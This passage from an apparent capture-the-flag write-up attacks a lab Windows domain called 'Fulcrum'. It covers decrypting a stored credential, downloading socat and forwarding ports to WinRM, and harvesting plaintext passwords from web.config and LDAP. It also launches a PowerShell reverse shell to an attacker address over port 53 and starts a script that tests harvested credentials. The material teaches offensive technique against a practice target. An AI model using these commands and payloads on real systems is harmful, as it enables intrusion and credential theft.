</span></span><span class="line"><span class="cl"><span class="nv">$5</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="p">(</span><span class="nv">$1</span><span class="p">,</span> <span class="nv">$4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Invoke-Command</span> <span class="n">-Computer</span> <span class="n">upload</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span> <span class="n">-Credential</span> <span class="nv">$5</span> <span class="o">-File</span> <span class="n">Data</span><span class="p">.</span><span class="n">ps1</span></span></span></code></pre></div></div>

<p>Read this: <a href="https://blogs.technet.microsoft.com/heyscriptingguy/2013/03/26/decrypt-powershell-secure-string-password/" target="_blank">https://blogs.technet.microsoft.com/heyscriptingguy/2013/03/26/decrypt-powershell-secure-string-password/</a>
If we run the above script code we can retrieve the password like this:</p>

<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">PS</span><span class="p">&gt;</span> <span class="nv">$5</span><span class="p">.</span><span class="n">GetNetworkCredential</span><span class="p">().</span><span class="n">Password</span>
</span></span><span class="line"><span class="cl"><span class="n">M4ng</span><span class="err">£</span><span class="n">m</span><span class="err">£</span><span class="n">ntPa55</span></span></span></code></pre></div></div>

<p>No need for Windoze. You can run the code online here: <a href="https://tio.run/#powershell" target="_blank">https://tio.run/#powershell</a> (or you can use powershell for linux: <a href="https://github.com/PowerShell/PowerShell" target="_blank">https://github.com/PowerShell/PowerShell</a>).</p>

<p>Now, we know those credentials WebUser:M4ng£m£ntPa55. If we look the file /etc/nginx/sites-enabled/default, we discover an interesting IP address: 192.168.122.228. This IP has port 5986 open (WS-Management a.k.a. WinRM a.k.a PowerShell Remoting). So, let&rsquo;s redirect the port 5986 of 192.168.122.228 to the port 60217 of 10.10.10.62. Then we can access it from outside. I prefer to use socat for this job (you can find it here: <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" target="_blank">https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat</a>).</p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">www-data@Fulcrum:/$ mkdir /dev/shm/.a
</span></span></span><span class="line"><span class="cl"><span class="go">www-data@Fulcrum:/$ cd /dev/shm/.a
</span></span></span><span class="line"><span class="cl"><span class="go">www-data@Fulcrum:/dev/shm/.a$ wget http://SRVHOST:SRVPORT/socat
</span></span></span><span class="line"><span class="cl"><span class="go">www-data@Fulcrum:/dev/shm/.a$ chmod +x socat
</span></span></span><span class="line"><span class="cl"><span class="go">www-data@Fulcrum:/dev/shm/.a$ ./socat tcp-listen:60217,reuseaddr,fork tcp:192.168.122.228:5986 &amp;
</span></span></span></code></pre></div></div>

<p>Now, we can use either Windows Powershell to connect or Ruby&rsquo;s winrm module. To connect from a windows box via my linux system I do a second port redirection like this:</p>

<p>On my linux system I run:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> socat tcp-listen:5986,reuseaddr,fork tcp:10.10.10.62:60217
</span></span></code></pre></div></div></p>

<p>On my windows powershell I run:</p>

<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">1</span> <span class="n">-Credential</span> <span class="nv">$5</span> <span class="n">-UseSSL</span> <span class="n">-SessionOption</span> <span class="p">(</span><span class="nb">New-PSSessionOption</span> <span class="n">-SkipCACheck</span> <span class="n">-SkipCNCheck</span><span class="p">)</span></span></span></code></pre></div></div>

<p>where 10.0.0.1 is the gateway for the Windows box i.e. my linux system.</p>

<p>Personally, I prefer to stay away from Windoze and I use ruby&rsquo;s winrm modules. You can see some examples here: <a href="https://github.com/Alamot/code-snippets/tree/master/winrm)" target="_blank">https://github.com/Alamot/code-snippets/tree/master/winrm)</a>. Your connection settings should be like this:
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="o">.</span><span class="n">new</span><span class="p">(</span> 
</span></span><span class="line"><span class="cl">  <span class="ss">endpoint</span><span class="p">:</span> <span class="s1">&#39;https://10.10.10.62:60217/wsman&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="ss">transport</span><span class="p">:</span> <span class="ss">:ssl</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="ss">user</span><span class="p">:</span> <span class="s1">&#39;WebUser&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="ss">password</span><span class="p">:</span> <span class="s1">&#39;M4ng£m£ntPa55&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="ss">:no_ssl_peer_verification</span> <span class="o">=&gt;</span> <span class="kp">true</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span></span></span></code></pre></div></p>

<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ruby winrm_shell_with_upload.rb
</span></span><span class="line"><span class="cl"><span class="go">PS webserver\webuser@WEBSERVER Documents&gt;
</span></span></span></code></pre></div></div>

<h1 id="getting-ldap-credentials">Getting LDAP credentials</h1>

<p>The file C:\Inetpub\wwwroot\web.config contains some credentials:</p>

<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="no">[System.Net.Dns]</span><span class="p">::</span><span class="n">GetHostByName</span><span class="p">((</span><span class="nv">$env:computerName</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HostName</span>  <span class="n">Aliases</span> <span class="n">AddressList</span>   
</span></span><span class="line"><span class="cl"><span class="p">--------</span>  <span class="p">-------</span> <span class="p">-----------</span>   
</span></span><span class="line"><span class="cl"><span class="n">WebServer</span> <span class="p">{}</span>      <span class="p">{</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">55</span><span class="p">.</span><span class="n">2</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="n">C:</span><span class="p">\</span><span class="n">Inetpub</span><span class="p">\</span><span class="n">wwwroot</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">wwwroot</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">web</span><span class="p">.</span><span class="n">config</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"> <span class="n">connectionUsername</span><span class="p">=</span><span class="s2">&#34;FULCRUM\LDAP&#34;</span> <span class="n">connectionPassword</span><span class="p">=</span><span class="s2">&#34;PasswordForSearching123!&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span></span></span></code></pre></div></div>

<h2 id="searching-ldap">Searching LDAP</h2>

<p>Let&rsquo;s see what computers we know using an LDAP query:</p>

<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Webuser</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">adsisearcher</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">adsi</span><span class="p">(</span><span class="s2">&#34;LDAP://dc.fulcrum.local&#34;</span><span class="p">,</span><span class="s2">&#34;fulcrum\ldap&#34;</span><span class="p">,</span><span class="s2">&#34;PasswordForSearching123!&#34;</span><span class="p">)),</span><span class="s2">&#34;(objectCategory=Computer)&#34;</span><span class="p">)).</span><span class="n">FindAll</span><span class="p">()</span> <span class="p">|</span> <span class="p">%{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span><span class="p">.</span><span class="n">name</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Path</span>                                                                    <span class="n">Properties</span>
</span></span><span class="line"><span class="cl"><span class="p">----</span>                                                                    <span class="p">----------</span>
</span></span><span class="line"><span class="cl"><span class="n">LDAP</span><span class="err">:</span><span class="p">//</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">CN</span><span class="p">=</span><span class="n">DC</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">Domain</span> <span class="n">Controllers</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">fulcrum</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span> <span class="p">{</span><span class="n">ridsetreferences</span><span class="p">,</span> <span class="n">logoncount</span><span class="p">,</span> <span class="n">codepage</span><span class="p">,</span> <span class="n">objectcategory</span><span class="p">...}</span>      
</span></span><span class="line"><span class="cl"><span class="n">LDAP</span><span class="err">:</span><span class="p">//</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">CN</span><span class="p">=</span><span class="n">FILE</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Computers</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">fulcrum</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span>        <span class="p">{</span><span class="n">logoncount</span><span class="p">,</span> <span class="n">codepage</span><span class="p">,</span> <span class="n">objectcategory</span><span class="p">,</span> <span class="n">iscriticalsystemobject</span><span class="p">...}</span></span></span></code></pre></div></div>

<p>We see two CNs: DC and FILE. Now let&rsquo;s query about info:
<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Webuser</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">adsisearcher</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">adsi</span><span class="p">(</span><span class="s2">&#34;LDAP://dc.fulcrum.local&#34;</span><span class="p">,</span><span class="s2">&#34;fulcrum\ldap&#34;</span><span class="p">,</span><span class="s2">&#34;PasswordForSearching123!&#34;</span><span class="p">)),</span><span class="s2">&#34;(info=*)&#34;</span><span class="p">)).</span><span class="n">FindAll</span><span class="p">()</span> <span class="p">|</span> <span class="p">%{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Name</span>                           <span class="n">Value</span>
</span></span><span class="line"><span class="cl"><span class="p">----</span>                           <span class="p">-----</span>
</span></span><span class="line"><span class="cl"><span class="n">logoncount</span>                     <span class="p">{</span><span class="n">18</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">codepage</span>                       <span class="p">{</span><span class="n">0</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">objectcategory</span>                 <span class="p">{</span><span class="n">CN</span><span class="p">=</span><span class="n">Person</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Schema</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">fulcrum</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">description</span>                    <span class="p">{</span><span class="n">Has</span> <span class="n">logon</span> <span class="n">rights</span> <span class="n">to</span> <span class="n">the</span> <span class="n">file</span> <span class="n">server</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">usnchanged</span>                     <span class="p">{</span><span class="n">143447</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">instancetype</span>                   <span class="p">{</span><span class="n">4</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">name</span>                           <span class="p">{</span><span class="n">Bobby</span> <span class="n">Tables</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">badpasswordtime</span>                <span class="p">{</span><span class="n">131522885566857829</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">pwdlastset</span>                     <span class="p">{</span><span class="n">131514417841217344</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">objectclass</span>                    <span class="p">{</span><span class="n">top</span><span class="p">,</span> <span class="n">person</span><span class="p">,</span> <span class="n">organizationalPerson</span><span class="p">,</span> <span class="n">user</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">badpwdcount</span>                    <span class="p">{</span><span class="n">0</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">samaccounttype</span>                 <span class="p">{</span><span class="n">805306368</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">lastlogontimestamp</span>             <span class="p">{</span><span class="n">131556801131693417</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">usncreated</span>                     <span class="p">{</span><span class="n">12878</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">objectguid</span>                     <span class="p">{</span><span class="n">88</span> <span class="n">53</span> <span class="n">29</span> <span class="n">79</span> <span class="n">114</span> <span class="n">147</span> <span class="n">100</span> <span class="n">75</span> <span class="n">187</span> <span class="n">41</span> <span class="n">125</span> <span class="n">239</span> <span class="n">148</span> <span class="n">113</span> <span class="n">13</span> <span class="n">111</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span>                           <span class="p">{</span><span class="n">Password</span> <span class="nb">set </span><span class="n">to</span> <span class="p">++</span><span class="n">FileServerLogon12345</span><span class="p">++}</span>
</span></span><span class="line"><span class="cl"><span class="n">whencreated</span>                    <span class="p">{</span><span class="n">10</span><span class="p">/</span><span class="n">2</span><span class="p">/</span><span class="n">2017</span> <span class="n">6</span><span class="err">:</span><span class="n">06</span><span class="err">:</span><span class="n">57</span> <span class="n">PM</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">adspath</span>                        <span class="p">{</span><span class="n">LDAP</span><span class="err">:</span><span class="p">//</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">CN</span><span class="p">=</span><span class="n">Bobby</span> <span class="n">Tables</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">People</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">fulcrum</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">useraccountcontrol</span>             <span class="p">{</span><span class="n">66048</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">cn</span>                             <span class="p">{</span><span class="n">Bobby</span> <span class="n">Tables</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">countrycode</span>                    <span class="p">{</span><span class="n">0</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">primarygroupid</span>                 <span class="p">{</span><span class="n">513</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">whenchanged</span>                    <span class="p">{</span><span class="n">11</span><span class="p">/</span><span class="n">20</span><span class="p">/</span><span class="n">2017</span> <span class="n">7</span><span class="err">:</span><span class="n">35</span><span class="err">:</span><span class="n">13</span> <span class="n">PM</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">dscorepropagationdata</span>          <span class="p">{</span><span class="n">10</span><span class="p">/</span><span class="n">2</span><span class="p">/</span><span class="n">2017</span> <span class="n">6</span><span class="err">:</span><span class="n">09</span><span class="err">:</span><span class="n">28</span> <span class="n">PM</span><span class="p">,</span> <span class="n">10</span><span class="p">/</span><span class="n">2</span><span class="p">/</span><span class="n">2017</span> <span class="n">6</span><span class="err">:</span><span class="n">06</span><span class="err">:</span><span class="n">57</span> <span class="n">PM</span><span class="p">,</span> <span class="n">1</span><span class="p">/</span><span class="n">1</span><span class="p">/</span><span class="n">1601</span> <span class="n">12</span><span class="err">:</span><span class="n">00</span><span class="err">:</span><span class="n">00</span> <span class="n">AM</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">lastlogon</span>                      <span class="p">{</span><span class="n">131556801131693417</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">distinguishedname</span>              <span class="p">{</span><span class="n">CN</span><span class="p">=</span><span class="n">Bobby</span> <span class="n">Tables</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">People</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">fulcrum</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">samaccountname</span>                 <span class="p">{</span><span class="n">BTables</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">objectsid</span>                      <span class="p">{</span><span class="n">1</span> <span class="n">5</span> <span class="n">0</span> <span class="n">0</span> <span class="n">0</span> <span class="n">0</span> <span class="n">0</span> <span class="n">5</span> <span class="n">21</span> <span class="n">0</span> <span class="n">0</span> <span class="n">0</span> <span class="n">70</span> <span class="n">111</span> <span class="n">187</span> <span class="n">188</span> <span class="n">76</span> <span class="n">255</span> <span class="n">138</span> <span class="n">170</span> <span class="n">168</span> <span class="n">71</span> <span class="n">215</span> <span class="n">161</span> <span class="n">80</span> <span class="n">4</span> <span class="n">0</span> <span class="n">0</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">lastlogoff</span>                     <span class="p">{</span><span class="n">0</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">displayname</span>                    <span class="p">{</span><span class="n">Bobby</span> <span class="n">Tables</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">accountexpires</span>                 <span class="p">{</span><span class="n">9223372036854775807</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">userprincipalname</span>              <span class="p">{</span><span class="n">BTables</span><span class="nv">@fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">}</span></span></span></code></pre></div></div></p>

<p>Bingo! We have found some credentials (fulcrum.local\btables:++FileServerLogon12345++) for the file server:
<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">webserver</span><span class="p">\</span><span class="n">webuser</span><span class="nv">@WEBSERVER</span> <span class="n">wwwroot</span><span class="p">&gt;</span> <span class="nb">Invoke-Command</span> <span class="n">-ComputerName</span> <span class="n">file</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span> <span class="n">-Credential</span> <span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">btables</span> <span class="n">-Port</span> <span class="n">5985</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">type </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Btables</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">user</span><span class="p">.</span><span class="n">txt</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fce52521c8f872b514f037fada78daf4</span></span></span></code></pre></div></div></p>

<h1 id="getting-shell-on-file-server-as-btables">Getting shell on fIle server as btables</h1>

<p>We can use port 53 to get a reverse shell on file server (I saw that port 53 was open via pfSense, read the funny story at the end for more details):
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;winrm&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">conn</span> <span class="o">=</span> <span class="no">WinRM</span><span class="o">::</span><span class="no">Connection</span><span class="o">.</span><span class="n">new</span><span class="p">(</span> 
</span></span><span class="line"><span class="cl">  <span class="ss">endpoint</span><span class="p">:</span> <span class="s1">&#39;https://10.10.10.62:60217/wsman&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="ss">transport</span><span class="p">:</span> <span class="ss">:ssl</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="ss">user</span><span class="p">:</span> <span class="s1">&#39;WebUser&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="ss">password</span><span class="p">:</span> <span class="s1">&#39;M4ng£m£ntPa55&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="ss">:no_ssl_peer_verification</span> <span class="o">=&gt;</span> <span class="kp">true</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">conn</span><span class="o">.</span><span class="n">shell</span><span class="p">(</span><span class="ss">:powershell</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">shell</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">  <span class="n">output</span> <span class="o">=</span> <span class="n">shell</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;$pass = convertto-securestring -AsPlainText -Force -String &#39;++FileServerLogon12345++&#39;; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist &#39;fulcrum.local</span><span class="se">\\</span><span class="s2">btables&#39;,$pass; Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -Port 5985 -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.15.154&#39;,53); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close(); }&#34;</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">    <span class="no">STDOUT</span><span class="o">.</span><span class="n">print</span> <span class="n">stdout</span>
</span></span><span class="line"><span class="cl">    <span class="no">STDERR</span><span class="o">.</span><span class="n">print</span> <span class="n">stderr</span>
</span></span><span class="line"><span class="cl">  <span class="k">end</span>
</span></span><span class="line"><span class="cl">  <span class="nb">puts</span> <span class="s2">&#34;The script exited with exit code </span><span class="si">#{</span><span class="n">output</span><span class="o">.</span><span class="n">exitcode</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">end</span></span></span></code></pre></div></p>

<p>Don&rsquo;t forget the listener:
<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo nc -lvp <span class="m">53</span>
</span></span><span class="line"><span class="cl"><span class="go">...
</span></span></span></code></pre></div></div></p>

<h1 id="privilege-escalation">Privilege Escalation</h1>

<p>Now we have a shell on the file server. We can use our credentials to get access on the netlogon share on the DC:
<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="n">net</span> <span class="n">use</span> <span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">netlogon</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span> <span class="p">++</span><span class="n">FileServerLogon12345</span><span class="p">++</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">Documents</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">netlogon</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">netlogon</span><span class="p">&gt;</span></span></span></code></pre></div></div></p>

<p>Here we find several interesting scripts like this one for example:
<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">fulcrum</span><span class="p">\</span><span class="n">btables</span><span class="nv">@FILE</span> <span class="n">netlogon</span><span class="p">&gt;</span>  <span class="nb">cat </span><span class="n">a1a41e90</span><span class="p">-</span><span class="n">147b</span><span class="p">-</span><span class="n">44c9</span><span class="p">-</span><span class="n">97d7-c9abb5ec0e2a</span><span class="p">.</span><span class="n">ps1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Map network drive v1.0</span>
</span></span><span class="line"><span class="cl"><span class="nv">$User</span> <span class="p">=</span> <span class="s1">&#39;923a&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Pass</span> <span class="p">=</span> <span class="s1">&#39;@fulcrum_bf392748ef4e_$&#39;</span> <span class="p">|</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
</span></span><span class="line"><span class="cl"><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="p">(</span><span class="nv">$User</span><span class="p">,</span> <span class="nv">$Pass</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">New-PSDrive</span> <span class="n">-Name</span> <span class="s1">&#39;\\file.fulcrum.local\global\&#39;</span> <span class="n">-PSProvider</span> <span class="n">FileSystem</span> <span class="n">-Root</span> <span class="s1">&#39;\\file.fulcrum.local\global\&#39;</span> <span class="n">-Persist</span> <span class="n">-Credential</span> <span class="nv">$Cred</span></span></span></code></pre></div></div></p>

<p>Let&rsquo;s write a very simple powershell script to test automatically all the user/pass pairs:
<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="k">function</span> <span class="n">test</span><span class="p">(</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="nb">new-object</span> <span class="n">directoryservices</span><span class="p">.</span><span class="n">directoryentry</span> <span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$u</span><span class="p">,</span><span class="nv">$p</span><span class="p">).</span><span class="n">psbase</span><span class="p">.</span><span class="n">name</span> <span class="o">-ne</span> <span class="nv">$null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$files</span> <span class="p">=</span> <span class="p">@(</span><span class="nb">Get-ChildItem</span> <span class="p">\\</span><span class="n">dc</span><span class="p">.</span><span class="n">fulcrum</span><span class="p">.</span><span class="n">local</span><span class="p">\</span><span class="n">netlogon</span><span class="p">\*.</span><span class="n">ps1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$file</span> <span class="k">in</span> <span class="nv">$files</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="p">=</span> <span class="nb">Select-String</span> <span class="n">-Path</span> <span class="nv">$file</span> <span class="n">-pattern</span> <span class="s2">&#34;&#39;(.*)&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="p">=</span> <span class="nv">$result</span><span class="p">.</span><span class="n">Matches</span><span class="p">[</span><span class="n">0</span><span class="p">].</span><span class="n">Groups</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Value</span><span class="p">;</span>
